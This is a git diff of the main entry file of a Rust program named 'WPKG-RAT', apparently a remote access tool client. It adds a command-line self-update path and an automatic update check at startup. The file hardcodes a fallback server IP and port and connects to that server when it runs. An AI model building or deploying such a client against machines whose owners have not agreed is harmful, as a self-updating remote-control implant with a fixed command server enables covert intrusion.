@@ -9,18 +9,39 @@ mod globals;
 mod logger;
 mod unwrap;
 mod utils;
+mod versions;
+
+use std::env;
 
 use tracing::*;
 
 use crate::addreses::{Address, Adresses};
+use crate::utils::Utils;
 
 /// Server ip backup if api isn't available
 pub const TCP_BACKUP_IP: &str = "136.243.156.104";
-/// Server port backup if api isn't available
+/// Server port backup if api isn't available   
 pub const TCP_BACKUP_PORT: u32 = 3217;
 
 #[tokio::main]
 async fn main() {
+            
+    // init logger
+    logger::init();
+
+    let args: Vec<String> = env::args().collect();
+    match args.iter().any(|v| v == "--update"){
+        true => {
+            let possision = args.iter().position(|r| r == "--update").unwrap();
+            Utils::update(&args[possision+1].to_string()).await.expect("Error updating");
+        },
+        false => ()
+    }
+    match Utils::check_updates().await{
+    Ok(_) => info!("Updates has been checked"),
+    Err(_) => error!("Failed to check updates"),
+    }
+
     println!("WPKG-RAT {}", env!("CARGO_PKG_VERSION"));
 
     // get tcp server ip address from the api
@@ -30,9 +51,6 @@ async fn main() {
         .get(0)
         .unwrap_or(&Address::default())
         .format();
-
-    // init logger
-    logger::init();
 
     #[cfg(not(target_os = "windows"))]
     warn!("RAT isn't runned on Windows. Some features may be unavailable. Use for debug only");
@@ -85,7 +103,6 @@ async fn main() {
             process::exit(0);
         }
     }
-
     // connect to the ServerD
     client::connect(tcp_address).await;
 }
